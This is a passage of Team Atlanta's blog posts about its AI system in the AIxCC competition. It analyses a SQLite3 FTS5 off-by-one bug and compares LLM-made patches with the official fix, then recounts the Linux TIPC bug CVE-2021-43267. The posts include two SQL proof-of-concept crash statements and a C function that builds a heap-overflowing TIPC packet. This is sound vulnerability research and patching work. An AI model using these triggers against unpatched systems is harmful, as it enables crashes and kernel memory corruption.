or security, I invite you to follow us on Twitter/X (@TeamAtlanta24) and join us on this exciting journey.\nFully sound patches address root causes while preserving correct system behavior.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"section":"Blog","slug":"/blog/post-asc-sqlite/","title":"Autonomously Uncovering and Fixing a Hidden Vulnerability in SQLite3 with an LLM-Based System","description":"SQLite3 in ASC","date":"August 28, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/asc-sqlite/sqlite-bug-finding_hu_a9e04e86be1a5c41.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/asc-sqlite\\/sqlite-bug-finding_hu_2fc6cc4e4258aef8.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/asc-sqlite/sqlite-bug-finding_hu_a8b2201771155688.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/asc-sqlite\\/sqlite-bug-finding_hu_e756cbb8915fac76.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Vulnerability Analysis","tags":"Atlantis CRS","content":"Without knowing beforehand that the challenge project involved SQLite3, our team, Team Atlanta, entered our Cyber Reasoning System (CRS), named Atlantis, into the AI Cyber Challenge organized by ARPA-H, DARPA, and the White House.\nRemarkably, Atlantis secured six first-bloods and autonomously identified and patched a real bug in SQLite31, earning us a $2 million prize and a place in the grand finals of AIxCC. For more details, check out our team\u0026rsquo;s announcement blog.\nIn this blog, we will outline our very high-level approach to using LLMs for bug detection and vulnerability remediation, provide an analysis of the fixed SQLite3 vulnerability, and discuss the challenges of using our LLM agents for such fixes.\nFollow us on Twitter/X (@TeamAtlanta24) if you\u0026rsquo;re interested in AI or security.\nThe Atlantis Cyber Reasoning System Atlantis is a end-to-end, large language model (LLM)-based bug-finding and fixing system designed to function entirely without human intervention. It is capable of handling complex systems like the Linux kernel and supports a range of modern programming languages, including C/C++, Java, and others.\nOur design philosophy is simple: to emulate the mindset of experienced security researchers and hackers through LLM agents, enhanced with advanced program analysis techniques.\nAtlantis is specifically designed to replicate the behavior of human researchers, particularly in auditing the Git repositories of open-source software (OSS). To harness the full potential of LLMs and address their limitations in tackling complex problems, we incorporate traditional program analysis techniques (both dynamic and static) to assist LLMs in decision-making.\nOne of the interesting features of Atlantis is our \u0026ldquo;baby-security-AGI\u0026rdquo; system, which can emulate the code auditing process based on the habits of the security experts on our team. It\u0026rsquo;s not magic; we\u0026rsquo;ve distilled our collective experience and common practices in manual auditing and reverse engineering into structured prompts, significantly enhancing the system\u0026rsquo;s capabilities.\nAll source code will be open-sourced in accordance with the AIxCC competition rules.\nThe Off-by-One Access in SQLite3 The hidden vulnerability was discovered in the FTS5 module of SQLite3 (link). The bug is located in the trigram tokenizer, which processes each contiguous sequence of three characters as a token, enabling FTS5 to support more general substring matching.\nWhen creating a virtual table, users can specify options in the trigram field (e.g., case_sensitive 1) as outlined in the documentation.\nHowever, if users fail to provide key-value pairs, SQLite3 does not adequately check for this and assumes that the value is present. This assumption can lead to an off-by-one access error. Because SQLite3 allocates a sufficient heap buffer in such cases, the off-by-one access is confined to the space within an allocated heap chunk. Additionally, due to SQLite\u0026rsquo;s good coding practices, it uses MallocZero to ensure no uninitialized variables exist, which ultimately results in a zero pointer dereference.\nClick me to show the vulnerable code in SQLite3 static int fts5TriCreate( void *pUnused, const char **azArg, int nArg, Fts5Tokenizer **ppOut ){ int rc = SQLITE_OK; TrigramTokenizer *pNew = (TrigramTokenizer*)sqlite3_malloc(sizeof(*pNew)); UNUSED_PARAM(pUnused); if( pNew==0 ){ rc = SQLITE_NOMEM; }else{ int i; pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; \u0026lt;---- off-by-one if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ \u0026lt;----null dereference rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); } }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ \u0026lt;-- rc = SQLITE_ERROR; }else{ pNew-\u0026gt;iFoldParam = (zArg[0]!=\u0026#39;0\u0026#39;) ? 2 : 0; } }else{ rc = SQLITE_ERROR; } } if( pNew-\u0026gt;iFoldParam!=0 \u0026amp;\u0026amp; pNew-\u0026gt;bFold==0 ){ rc = SQLITE_ERROR; } if( rc!=SQLITE_OK ){ fts5TriDelete((Fts5Tokenizer*)pNew); pNew = 0; } } *ppOut = (Fts5Tokenizer*)pNew; return rc; } Working proof-of-concepts (PoCs) to trigger the bug are as follows:\nPoC 1: CREATE VIRTUAL TABLE t USING fts5(s, tokenize=\u0026#39;trigram case_sensitive\u0026#39;); PoC 2: CREATE VIRTUAL TABLE t USING fts5(s, tokenize=\u0026#39;trigram remove_diacritics\u0026#39;); While human researchers might consider this bug trivial, I am still pleased that our system enabled us to be the only team to discover a real bug—even without knowing that the challenge project was SQLite3.\nAuto-Generated Patch vs Human-Write Patch Automatically patching the aforementioned bug is challenging because a perfect patch2 requires the human or AI patcher to understand that the arguments are paired and that the null pointer dereference results from an off-by-one heap access within a glibc-allocated heap chunk.\nIn other words, the actual root cause is a semantic inconsistency concerning the paired arguments. Therefore, the patcher needs to recognize that the code must verify if the number of arguments is even.\nGenerating Patches Using a Naive Zero-Shot Prompt To get a basic sense of how LLMs reason about patch generation, I asked the models to analyze the root cause and generate a patch for the given bug using the crash logs, PoCs, and the code of the fts5TriCreate() function.\nA patch generated by Claude 3.5 sonnet --- a/sqlite3.c +++ b/sqlite3.c @@ -255841,7 +255841,7 @@ static int fts5TriCreate( for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ - if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ + if( !zArg || (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); @@ -255849,7 +255849,7 @@ static int fts5TriCreate( }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ - if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ + if( !zArg || (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;iFoldParam = (zArg[0]!=\u0026#39;0\u0026#39;) ? 2 : 0; A patch generated by ChatGPT 4o --- a/sqlite3.c +++ b/sqlite3.c @@ -255835,11 +255835,15 @@ pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ const char *zArg = azArg[i+1]; - if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ + if( i+1 \u0026gt;= nArg || azArg[i+1] == NULL ){ + rc = SQLITE_ERROR; + }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ pNew-\u0026gt;bFold = (zArg[0]==\u0026#39;0\u0026#39;); } }else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; The patches are fairly close to \u0026ldquo;good patches,\u0026rdquo; and the models almost identify the root causes. However, due to my simple zero-shot prompt, there are still a few minor issues. For example, the patch generated by Claude effectively mitigates the bug by ensuring that a null pointer is always handled when the bug is triggered, but it doesn\u0026rsquo;t fully address the off-by-one root cause. The patch generated by GPT-4o addresses the bounds check but only covers the case_sensitive branch, missing the remove_diacritics branch.\nNonetheless, the results are promising given that a simple prompt was used, and the LLMs almost arrived at the correct solution. However, in real-world scenarios, patch generation can be much more challenging, as it requires locating the source code of the vulnerable parts in a large codebase, dealing with indeterminate results, handling hallucinations, and validating correctness, among other issues.\nPatch Generated by Atlantis CRS Atlantis CRS generates patches by incrementally applying domain-specific knowledge with multiple LLM agents and iteratively refining them using a custom validation oracle. The patch generated by Atlantis is as follows:\ndiff --git a/ext/fts5/fts5_tokenize.c b/ext/fts5/fts5_tokenize.c index f12056170..552f14be9 100644 --- a/ext/fts5/fts5_tokenize.c +++ b/ext/fts5/fts5_tokenize.c @@ -1299,8 +1299,10 @@ static int fts5TriCreate( pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ - const char *zArg = azArg[i+1]; - if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ + const char *zArg = (i+1 \u0026lt; nArg) ? azArg[i+1] : NULL; + if (zArg == NULL) { + rc = SQLITE_ERROR; + } else if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ rc = SQLITE_ERROR; }else{ The auto-generated patch successfully checks the bounds and provides additional protection against null pointer dereference. In this case, Atlantis spent ~15 minutes for the entire building, patch generation, iteration, and correctness-validation process, demonstrating its promising potential for application to real-world software.\nAdmittedly, our patching techniques are still in their prototype stages, as we require more time to apply and evaluate the many new ideas we have. However, the patch above illustrates that LLM-based automated vulnerability remediation is a very feasible direction.\nThanks Seunggi for collecting the statistics when patching the bug.\nOfficial SQLite3 patch Click me to show SQlite3's official patch commit e9b919d550262076d1b8453c3d6852b88822b922 Author: drh \u0026lt;\u0026gt; Date: Tue Aug 6 22:49:01 2024 +0000 Improved robustness of parsing of tokenize= arguments in FTS5. [forum:/forumpost/171bcc2bcd|Forum post 171bcc2bcd]. FossilOrigin-Name: d9f726ade6b258f8723f90d0b04a4682e885e30939eb29773913e4dfc8e85503 diff --git a/ext/fts5/fts5_tokenize.c b/ext/fts5/fts5_tokenize.c index 3e9fdff3e..08de0d60d 100644 --- a/ext/fts5/fts5_tokenize.c +++ b/ext/fts5/fts5_tokenize.c @@ -79,7 +79,7 @@ static int fts5AsciiCreate( int i; memset(p, 0, sizeof(AsciiTokenizer)); memcpy(p-\u0026gt;aTokenChar, aAsciiTokenChar, sizeof(aAsciiTokenChar)); - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;tokenchars\u0026#34;) ){ fts5AsciiAddExceptions(p, zArg, 1); @@ -90,6 +90,7 @@ static int fts5AsciiCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; if( rc!=SQLITE_OK ){ fts5AsciiDelete((Fts5Tokenizer*)p); p = 0; @@ -381,17 +382,16 @@ static int fts5UnicodeCreate( } /* Search for a \u0026#34;categories\u0026#34; argument */ - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ if( 0==sqlite3_stricmp(azArg[i], \u0026#34;categories\u0026#34;) ){ zCat = azArg[i+1]; } } - if( rc==SQLITE_OK ){ rc = unicodeSetCategories(p, zCat); } - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;remove_diacritics\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;2\u0026#39;) || zArg[1] ){ @@ -416,6 +416,7 @@ static int fts5UnicodeCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; }else{ rc = SQLITE_NOMEM; @@ -1298,7 +1299,7 @@ static int fts5TriCreate( int i; pNew-\u0026gt;bFold = 1; pNew-\u0026gt;iFoldParam = 0; - for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg; i+=2){ + for(i=0; rc==SQLITE_OK \u0026amp;\u0026amp; i\u0026lt;nArg-1; i+=2){ const char *zArg = azArg[i+1]; if( 0==sqlite3_stricmp(azArg[i], \u0026#34;case_sensitive\u0026#34;) ){ if( (zArg[0]!=\u0026#39;0\u0026#39; \u0026amp;\u0026amp; zArg[0]!=\u0026#39;1\u0026#39;) || zArg[1] ){ @@ -1316,6 +1317,7 @@ static int fts5TriCreate( rc = SQLITE_ERROR; } } + if( i\u0026lt;nArg ) rc = SQLITE_ERROR; if( pNew-\u0026gt;iFoldParam!=0 \u0026amp;\u0026amp; pNew-\u0026gt;bFold==0 ){ rc = SQLITE_ERROR; The patch changes the loop boundary and checks early exit to prevent out-of-bounds access. After the loop, there\u0026rsquo;s an additional check:\nif( i\u0026lt;nArg ) rc = SQLITE_ERROR; This check ensures that all arguments were processed. If i is less than nArg after the loop, it means there was an odd numbers of arguments, which is considered an error because the arguments should always come in pairs.\nInterestingly, the maintainer patched fts5UnicodeCreate() and fts5AsciiCreate() as well because similar code patterns existing there. It actually shows the strength of human-write patches because developers remember potential buggy paths in their code base. However, the additional checks are actually unnecessary because the checks are already at the beginning of the functions. It demonstrates human-write patches are not perfect as well.\nstatic int fts5AsciiCreate( void *pUnused, const char **azArg, int nArg, Fts5Tokenizer **ppOut ){ int rc = SQLITE_OK; AsciiTokenizer *p = 0; UNUSED_PARAM(pUnused); if( nArg%2 ){ \u0026lt;---- already checks rc = SQLITE_ERROR; }else{ --\u0026gt; unnecessary checks \u0026lt;--- I believe the maintainers notice the issues so that they changed their patch in b651084 by checking if (nArgs % 2) == 0 at the beginning of fts5TriCreate(). At the same time, they removed the unnecessary patches in fts5AsciiCreate() and fts5UnicodeCreate().\nThe Author\u0026rsquo;s Random Thoughts By leveraging generative AI models (GenAI) as \u0026ldquo;high-level\u0026rdquo; static analysis tools, we can significantly enhance automated bug finding, thanks to their proficiency in code explanation. For example, complex program analysis tasks such as points-to analysis and inter-procedural analysis, which are challenging for traditional compilers, can be approached differently using GenAI through retrieve-augmented generation (RAG). Additionally, GenAI opens new possibilities for automatic exploit generation and vulnerability remediation due to its strong capabilities in code writing.\nHowever, GenAI is not a cure-all and is far from perfect. That\u0026rsquo;s why our hybrid system is designed to improve GenAI\u0026rsquo;s performance in security research by addressing common issues such as LLM hallucinations, scalability, and domain-specific challenges for particular software.\nAIxCC has provided our team with a fantastic opportunity to put into practice the insights gained from decades of security research in both academia and industry. If you\u0026rsquo;re interested in learning more about our team and the work done by our team members, please feel free to contact us!\nFollow us on Twitter/X (@TeamAtlanta24) if you\u0026rsquo;re interested in AI or security.\nDiscovering previously unknown bugs does not count as a valid score in the competition. Team Atlanta secured a finalist spot by submitting the intended bugs and patches for AIxCC.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nThe word \u0026ldquo;perfect patch\u0026rdquo; is a vague concept in my mind. To clarify, a patch should comprehend the context and semantics of the program and address the actual root causes rather than merely adding superficial checks to bypass address sanitizers (ASAN).\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"section":"Blog","slug":"/blog/post-atl/","title":"Announcing Team Atlanta!","description":"Beginning","date":"August 13, 2024","image":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl/team_hu_10735b3afab863cf.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"420\"\n          height=\"315\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl\\/team_hu_d7c7a8cfea6b78e0.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","imageSM":"\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n  \n\n\n\n\n\n  \n\n  \n  \n    \n      \n    \n\n\n    \n    \n\n\n    \n    \n      \n      \n    \n    \n    \n\n\n    \n    \n      \n      \n        \n        \n        \n        \n        \n        \n          \n          \n          \n          \n        \n\n\n        \n        \n\n\n        \u003cimg\n          \n            src=\"/images/blog/atl/team_hu_de4aeb404ef1d2c1.webp\" loading=\"lazy\" decoding=\"async\"\n          \n\n          alt=\"\"\n          class=\"  img\"\n          width=\"100\"\n          height=\"100\"\n          onerror=\"this.onerror='null';this.src='\\/images\\/blog\\/atl\\/team_hu_7581c14e352d94f1.png';\" /\u003e\n\n        \n      \n      \n    \n    \n  \n\n\n  \n","searchKeyword":"","categories":"Announcement","tags":"team","content":"Hello, world! We are Team Atlanta, the minds behind Atlantis, our innovative AI-driven cybersecurity solution competing in the prestigious DARPA AIxCC.\nOur team is a collaborative powerhouse made up of six leading institutions: Georgia Tech, GTRI, Samsung Research, Samsung Research America, KAIST, and POSTECH. Each of these organizations is led by Georgia Tech alumni, and includes past winners of prestigious hacking competitions such as DEF CON CTF, Pwn2Own and kernelCTF.\nFor the past several months, we have been diligently preparing for this competition, combining our expertise in AI, cybersecurity, and software engineering. Last week, we proudly competed in the AIxCC Semifinals, showcasing our hard work and dedication to advancing cybersecurity through artificial intelligence.\nThe Journey Begins When AIxCC was announced last year, we quickly assembled a team of friends, including Zellic and SSLab. At that time, much was uncertain; details about the game format, scoring rubric, proof-of-vulnerability (PoV), sanitizers, harnesses, supported programming languages, and proof-of-understanding (PoU) were all unclear. Our team, however, started preparing for the competition from last October.\nMany of our team members previously participated in the DARPA Cyber Grand Challenge (CGC) as part of Crspy, where we were responsible for bug finding and exploitation generation. DARPA CGC was an ambitious endeavor that sparked numerous innovative research directions afterward. However, the competition was not without its challenges, particularly due to the gamification of the event; the scoring metrics and rules significantly influenced the outcomes. In the end, the competing Cyber Reasoning Systems (CRS) that focused on operating reactively\u0026ndash;prioritizing the availability score over fixing bugs\u0026ndash; tended to score higher, as exploitation proved to be far more difficult than patching.\nAware of the gamification issues from CGC, we anticipated that to excel in AIxCC our CRS should leverage AI, particularly LLMs, aggressively in various depths and levels of the CRS pipelines. With this in mind, we strategically chose to focus our efforts on two key directions:\nStatic Analysis. To encourage the use of LLMs and set AIxCC apart from CGC, we anticipated that AIxCC would strongly advocate for the adoption of static analysis while steering away from the dominant use of fuzzing1. It\u0026rsquo;s important to note that finding bugs is quite different from finding crash- or bug-triggering inputs. The latter offers a clear advantage in objectively and autonomously verifying the discovered bug, but it has a much narrower scope compared to the former. In practice, the triggering aspect, also known as the reachability problem, is a significantly more challenging and crucial issue to address, where dynamic tools like fuzzing have a clear edge.\nFine-tuning LLMs for Source Code. Specialization is always an advantage when possible. Given that each CRS will likely need to support more than 10 programming languages during the competition, we decided to fine-tune both in-house and open-source models for analyzing code. This approach is conceptually similar to commitPack, but focuses on commits related to bugs like their fixes, bug-introducing commits, descriptions, and public exploits, if available. Our expectation was that training with this data would enable the fine-tuned LLM to reason about security bugs, their fixes, and likely input corpus, more effectively than the foundational model.\nWe quickly realized that to pursue these directions effectively, we first needed a dataset: a benchmark. Our team divided tasks into three areas: 1) static analysis using LLM prompts/agents, 2) developing a C benchmark from sources like CGC and OSS-Fuzz, and 3) collecting a training dataset pairing CVEs with patches and PoCs for open-source projects to fine-tune our in-house code model at Samsung or to leverage open-source LLMs.\nRemarkably, within 4-5 months, we accomplished all three goals, and our LLM-based Cyber Reasoning System (CRS), dubbed Skynet, performed surprisingly well on our benchmark, and fine-tuning on a smaller dataset shows some promises like in python.\nTime flew by. The cold winter of 2023 ended, and we found ourselves in the new year of 2024. I vividly remember that around this time, our dear friends from Zellic left our team to pursue the Small Business Innovation Research (SBIR) track, which DARPA supports with $1 million for the competition. Unfortunately, Georgia Tech and Samsung were not eligible for this award.\nKick-off with Surprises! At the kick-off event on March 29th, AIxCC unveiled the first challenge project: the Linux kernel, along with an example vulnerability, CVE-2021-43267. This bug is well documented, and its PoC exploit is publicly available, making it an excellent example to work on.\nWhat makes this bug even more intriguing is the story behind it. A security researcher audited the Linux kernel source code using CodeQL. Specifically, the researcher was searching for instances where 16-bit size parameters are passed to the kmalloc() function for memory allocation, using a dataflow-based CodeQL query. The intuition was that a 16-bit size parameter could easily lead to an integer overflow when accessing the allocated object. However, the discovered bug was not caused by an integer overflow, but an out-of-bound heap overflow due to a missing sanity check on the size and related inputs.\nstatic bool tipc_crypto_key_rcv(struct tipc_crypto *rx, struct tipc_msg *hdr) { struct tipc_crypto *tx = tipc_net(rx-\u0026gt;net)-\u0026gt;crypto_tx; struct tipc_aead_key *skey = NULL; u16 key_gen = msg_key_gen(hdr); u16 size = msg_data_sz(hdr); u8 *data = msg_data(hdr); ... /* Allocate memory for the key */ skey = kmalloc(size, GFP_ATOMIC); if (unlikely(!skey)) { pr_err(\u0026#34;%s: unable to allocate memory for skey\\n\u0026#34;, rx-\u0026gt;name); goto exit; } /* Copy key from msg data */ skey-\u0026gt;keylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME))); memcpy(skey-\u0026gt;alg_name, data, TIPC_AEAD_ALG_NAME); memcpy(skey-\u0026gt;key, data + TIPC_AEAD_ALG_NAME + sizeof(__be32), skey-\u0026gt;keylen); The skey was allocated with a size based on the user-provided hdr, but skey-\u0026gt;key was copied up to skey-\u0026gt;keylen, which was also user-controlled and could therefore be inconsistent with size. Unfortunately, the kernel did not perform a sanity check on these two parameters, causing an out-of-boundary access.\ncommit fa40d9734a57bcbfa79a280189799f76c88f7bb0 Author: Max VA \u0026lt;maxv@sentinelone.com\u0026gt; Date: Mon Oct 25 17:31:53 2021 +0200 tipc: fix size validations for the MSG_CRYPTO type The function tipc_crypto_key_rcv is used to parse MSG_CRYPTO messages to receive keys from other nodes in the cluster in order to decrypt any further messages from them. This patch verifies that any supplied sizes in the message body are valid for the received message. diff --git a/net/tipc/crypto.c b/net/tipc/crypto.c index c9391d38de85..dc60c32bb70d 100644 --- a/net/tipc/crypto.c +++ b/net/tipc/crypto.c @@ -2285,43 +2285,53 @@ static bool tipc_crypto_key_rcv(struct tipc_crypto *rx, struct tipc_msg *hdr) u16 key_gen = msg_key_gen(hdr); u16 size = msg_data_sz(hdr); u8 *data = msg_data(hdr); +\tunsigned int keylen; + +\t/* Verify whether the size can exist in the packet */ +\tif (unlikely(size \u0026lt; sizeof(struct tipc_aead_key) + TIPC_AEAD_KEYLEN_MIN)) { +\tpr_debug(\u0026#34;%s: message data size is too small\\n\u0026#34;, rx-\u0026gt;name); +\tgoto exit; +\t} + +\tkeylen = ntohl(*((__be32 *)(data + TIPC_AEAD_ALG_NAME))); + +\t/* Verify the supplied size values */ +\tif (unlikely(size != keylen + sizeof(struct tipc_aead_key) || +\tkeylen \u0026gt; TIPC_AEAD_KEY_SIZE_MAX)) { +\tpr_debug(\u0026#34;%s: invalid MSG_CRYPTO key size\\n\u0026#34;, rx-\u0026gt;name); +\tgoto exit; +\t} Two checks were added to fix this bug: verifying that size is greater than the minimum key size, and ensuring that keylen is consistent with size, thereby preventing access beyond the allocated object.\nMisunderstanding 1: PoV Given a massive Linux repository (yes, 20 million lines of code), where should we start? The LLM approach is all about asking the right questions, also known as prompt engineering. We utilized various techniques like Chain-of-Thought (CoT) and Tree-of-Thoughts (ToT), and were exploring Retrieval Augmented Generation (RAG) to quickly identify known 1-day bugs.\nAt that time, context size was limited; the most advanced model, gpt-3.5 turbo (yes, pre-gpt-4 era) from OpenAI, supported 16k tokens, making it crucial to ask the right question! We initially tried identifying potentially vulnerable code snippets using a range of static analysis tools, including CodeQL, Semgrep and various tools from academic publications, and then filtered the results with LLMs. We even considered diffing the upstream Linux kernel against the provided repository, so that our CRS can look at the modified part of the code first.\nWe were confident our decision; to promote the use of AI tools, the AIxCC organizers would design the competition in a way that allows a single CRS codebase to explore any code repository using 10+ programming languages and their combinations.\nAh, around that time, Google had just announced gemini-pro with an impressive 128k context and the potential to support 1 million tokens! Meanwhile, gpt-4 introduced a game-changing feature called function calling, which allows the LLM to select which callback to use and integrate the results back into the prompt at runtime. We felt that everything was evolving favorably for our CRS to adopt these cutting-edge techniques.\nHowever, PoV turned out to mean bug-triggering input or a crashing input. To demonstrate the existence of a bug, each CRS needed to formulate an input that the referee could quickly verify. While this approach is straightforward and objective for the competition, it significantly discourages the adoption of LLMs in finding bugs. Our team quickly realized that we needed to pivot to the dynamic approaches like fuzzing for the competition.\nvoid tipc_trigger(uint8_t *smashbuf, uint32_t smashlen, int seqno) { uint8_t pkt[0x1000]; uint32_t w0, w1, w2, w3, w4, w5; w0 = hdr_version(TIPC_VERSION); w0 |= hdr_size(6); w0 |= hdr_user(MSG_CRYPTO); w0 |= hdr_msg_size(24 + 36 + KEY_SIZE); w1 = 0; w2 = seqno; w3 = NODE_ID; w4 = 0; w5 = 0; memset(pkt, 0, sizeof(pkt)); gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5); memcpy(pkt+24, \u0026#34;HAXX\u0026#34;, 4); *(uint32_t*)(pkt+24+32) = be32(KEY_SIZE + SMASH_SIZE + smashlen); // \u0026lt;- (1) memset(pkt+24+36, \u0026#39;C\u0026#39;, KEY_SIZE); memset(pkt+24+36+KEY_SIZE, \u0026#39;D\u0026#39;, SMASH_SIZE); memcpy(pkt+24+36+KEY_SIZE + SMASH_SIZE, smashbuf, smashlen); tipc_send(pkt, sizeof(pkt)); } Formulating a bug-triggering input, including ensuring its reachability, is a far more challenging task than simply spotting buggy code in the repository. The strength of fuzzing, perhaps the opposite of a sophisticated LLM, is that once a bug is found, you almost always have a bug-triggering input.\nIn CVE-2021-43267, using CodeQL and auditing, one could identify this bug, but triggering it is an entirely different challenge, not to mention exploiting it. For example, TIPC must be properly set up first, and the keylen needs to be precisely crafted in (1) to trigger the bug.\nMisunderstanding 2. Harnesses Sorry, what\u0026rsquo;s the input needed to trigger CVE-2021-43267? even with a fuzzer?\nTo fuzz the Linux kernel, we needed a user program that calls a sequence of system calls with various arguments. Considering the Linux kernel has over 400 system calls to explore, this was far from ideal for a competition setting.\nWe initially assumed that harnesses and test cases would be provided to indicate which parts of the Linux kernel should be checked for bugs. To tackle this, we implemented and adopted various versions of Linux kernel fuzzers, including a custom kernel syscall fuzzer with kcov and kcmp, and also utilized the most popular Linux fuzzer, Syzkaller. However, our focus remained on determining which sequences of system calls to test, using syscall traces and static analysis of the provided program, and then correctly formulating an end-to-end userspace program to trigger the bug.\n/*** * Blob begins with a 4 byte command count * [4-bytes command count] * Currently there are two commands: * 0 - send a packet blob * [4-bytes size][4-bytes send flags][size-bytes packet data] * 1 - send a netlink packet * [4-bytes Message Type][4-bytes Message Flags][4-bytes Netlink Protocol][4-bytes size][size bytes data] * blob_size MUST be a trusted value */ int harness( uint8_t *blob, uint32_t blob_size) { ... } The Linux Kernel CP was announced in April and came with a harness, linux_test_harness.c. This announcement 